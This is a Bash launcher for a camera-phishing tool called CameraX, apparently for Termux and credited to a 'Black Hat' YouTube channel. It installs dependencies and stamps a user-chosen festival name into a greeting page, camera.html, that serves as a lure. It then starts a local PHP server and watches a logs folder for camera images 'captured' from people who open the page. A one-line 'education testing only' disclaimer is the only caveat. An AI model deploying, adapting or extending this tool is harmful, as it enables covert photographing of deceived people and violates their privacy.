#!/bin/bash

# Colors
green='\e[92m'
yellow='\e[93m'
cyan='\e[96m'
red='\e[91m'
blue='\e[94m'
reset='\e[0m'

# Auto-install required packages
echo -e "${yellow}[+] Checking required packages...${reset}"
pkgs=(php inotify-tools)
for pkg in "${pkgs[@]}"; do
    if ! command -v $pkg >/dev/null 2>&1; then
        echo -e "${cyan}Installing $pkg...${reset}"
        pkg install $pkg -y >/dev/null 2>&1
    fi
done

# Banner
clear
echo -e "${red}  ██████╗ █████╗ ███╗   ███╗███████╗██████╗  █████╗ ██╗  ██╗${reset}"
echo -e "${red} ██╔════╝██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔══██╗╚██╗██╔╝${reset}"
echo -e "${red} ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████║ ╚███╔╝ ${reset}"
echo -e "${red} ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗██╔══██║ ██╔██╗ ${reset}"
echo -e "${red} ╚██████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║██║  ██║██╔╝ ██╗${reset}"
echo -e "${red}  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝${reset}"
echo ""
echo -e "${cyan}           --- CAMERAX TOOL (Local Version) ---${reset}"
echo -e "${green}           Created by: Priyanshu Gupta 💯${reset}"
echo -e "${blue}           Subscribe: The Black Hat Priyanshu${reset}"
echo ""

# Festival Name
echo -ne "${yellow}[+] Enter Festival Name (e.g. Holi/Diwali): ${reset}"
read fest
fest_slug=$(echo "$fest" | tr '[:upper:]' '[:lower:]' | tr ' ' '_')

# Update festival name in camera.html
if [ -f "camera.html" ]; then
    sed -i "s|⭐ Happy .* ⭐|⭐ Happy $(echo "$fest" | sed 's/[&/\]/\\&/g') ⭐|g" camera.html
fi

# Start PHP Server
echo -e "${yellow}\n[+] Starting Localhost PHP server...${reset}"
mkdir -p logs
killall php >/dev/null 2>&1
php -S 127.0.0.1:8080 >/dev/null 2>&1 &
sleep 2

# Show Link
link="http://127.0.0.1:8080"
echo -e "${cyan}--------------------------------------------${reset}"
echo -e "${green}[+] URL: ${reset}${yellow}$link${reset}"
echo -e "${cyan}--------------------------------------------${reset}"
echo -e "${red}[!] Note: This is for local education testing only.${reset}"

# Monitor Captured Images
echo -e "\n${yellow}[*] Waiting for camera activity...${reset}"
last_file=""
while true; do
    new_file=$(inotifywait -e create --format '%f' logs 2>/dev/null)
    if [[ "$new_file" != "$last_file" ]]; then
        echo -e "${green}[+] Captured: logs/$new_file ${reset}($(date +%H:%M:%S))"
        last_file="$new_file"
    fi
done
